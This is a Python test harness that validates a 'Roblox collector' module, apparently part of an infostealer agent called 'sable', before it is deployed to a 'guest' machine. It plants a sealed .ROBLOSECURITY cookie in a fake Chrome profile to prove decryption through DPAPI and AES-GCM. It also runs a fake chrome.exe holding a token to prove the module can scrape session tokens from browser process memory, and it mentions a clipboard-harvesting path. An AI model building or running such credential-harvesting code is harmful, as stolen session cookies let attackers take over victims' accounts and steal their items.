"""Prove the Roblox collector on this machine before it goes near the guest.

Two halves, in the order the module runs them:

  1. a Chrome profile whose cookie store holds a sealed ``.ROBLOSECURITY`` row, read
     through the real DPAPI + AES-GCM path;
  2. a process named ``chrome.exe`` holding a different, known token in memory, with
     the profile pointed somewhere empty so the memory path is the only one left.

The memory half uses a renamed copy of the embedded interpreter: the scanner keys off
the image name, which is exactly what a real browser would present.
"""

from __future__ import annotations

import hashlib
import os
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import time
import zipfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent / "sable"))
sys.path.insert(0, str(HERE))

import sable_fixture as fixture  # noqa: E402
from agent.sources import roblox  # noqa: E402

PREFIX = (
    b"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-"
    b"and-to-steal-your-ROBUX-and-items.|"
)
STORE_TOKEN = (PREFIX + b"DB" + b"0123456789abcdef" * 6).decode()
MEMORY_TOKEN = (PREFIX + b"MEM" + b"fedcba9876543210" * 6).decode()
HOST = ".roblox.com"


def sealdb(profile: Path) -> None:
    connection = sqlite3.connect(str(profile / "Network" / "Cookies"))
    binding = hashlib.sha256(HOST.encode()).digest()
    connection.execute(
        "INSERT INTO cookies (host_key, name, value, encrypted_value, path, expires_utc,"
        " last_access_utc, is_secure, is_httponly, samesite) VALUES (?,?,?,?,?,?,?,?,?,?)",
        (HOST, ".ROBLOSECURITY", "", fixture.seal(binding + STORE_TOKEN.encode()),
         "/", 13400000000000000, 13390000000000000, 1, 1, 0),
    )
    connection.commit()
    connection.close()


def stage_chrome(root: Path, token: str) -> Path:
    """An embedded interpreter laid out as ``chrome.exe`` with the token in memory."""
    seed = HERE / "_out" / "live" / "guest-py.zip"
    if not seed.is_file():
        raise SystemExit(f"missing seed: {seed}")
    with zipfile.ZipFile(seed) as archive:
        archive.extractall(root)
    py = root / "py"
    chrome = py / "chrome.exe"
    shutil.copy2(py / "python.exe", chrome)
    holder = root / "hold.py"
    holder.write_text(
        "import time\n"
        f"TOKEN = {token!r}\n"
        "time.sleep(120)\n",
        encoding="utf-8",
    )
    return chrome, holder


def main() -> int:
    work = Path(tempfile.mkdtemp(prefix="roblox-probe-"))
    failures = 0

    # The clipboard is a carrier of its own (a pasted DevTools request), and whatever the
    # operator copied last would otherwise land in both halves and turn a two-part probe
    # into a three-part one. It has its own contract test; here it is stubbed out.
    roblox._clipboard_tokens = lambda: ([], {"read": 0, "found": 0, "reason": "stubbed"})

    # --- 1. the store ---
    local = work / "local"
    local.mkdir()
    os.environ["LOCALAPPDATA"] = str(local)
    profile = fixture.build(local / "Google" / "Chrome")
    sealdb(profile)

    out1 = work / "out-store"
    out1.mkdir()
    count = roblox.run(out1, None)
    text = (out1 / roblox.SESSION_FILE).read_text(encoding="utf-8") if (out1 / roblox.SESSION_FILE).is_file() else ""
    lines = [line.strip() for line in text.splitlines() if line.strip()]
    ok = STORE_TOKEN in lines
    print(f"{'PASS' if ok else 'FAIL'}  store   count={count} exact={STORE_TOKEN in lines}")
    failures += 0 if ok else 1
    print("      " + (out1 / roblox.STATUS_FILE).read_text(encoding="utf-8").replace("\n", " ")[:200])

    # --- 2. memory only ---
    empty = work / "local-empty"
    empty.mkdir()
    os.environ["LOCALAPPDATA"] = str(empty)

    chrome, holder = stage_chrome(work / "fake", MEMORY_TOKEN)
    child = subprocess.Popen([str(chrome), str(holder)], cwd=str(chrome.parent))
    try:
        time.sleep(3)
        alive = child.poll() is None
        print(f"      fake chrome pid={child.pid} alive={alive}")
        from agent import winapi

        every = winapi.process_list()
        wanted = {n.lower() for n in roblox._PROCESS_NAMES}
        chromes = [(pid, name) for pid, name in every if name.lower() in wanted]
        print(f"      total procs={len(every)} browsers={len(chromes)} ours={[(p, n) for p, n in every if p == child.pid]}")
        out2 = work / "out-memory"
        out2.mkdir()
        count2 = roblox.run(out2, None)
        path2 = out2 / roblox.SESSION_FILE
        text2 = path2.read_text(encoding="utf-8") if path2.is_file() else ""
        ok2 = MEMORY_TOKEN in text2.splitlines()
        print(f"{'PASS' if ok2 else 'FAIL'}  memory  count={count2} exact={MEMORY_TOKEN in text2.splitlines()}")
        failures += 0 if ok2 else 1
        status = out2 / roblox.STATUS_FILE
        if status.is_file():
            body = status.read_text(encoding="utf-8")
            print("      " + " ".join(body.split())[:320])
    finally:
        child.terminate()
        try:
            child.wait(timeout=10)
        except Exception:
            child.kill()

    print(f"\n{'green' if failures == 0 else 'red'} — {2 - failures}/2")
    print(f"work dir: {work}")
    return 0 if failures == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
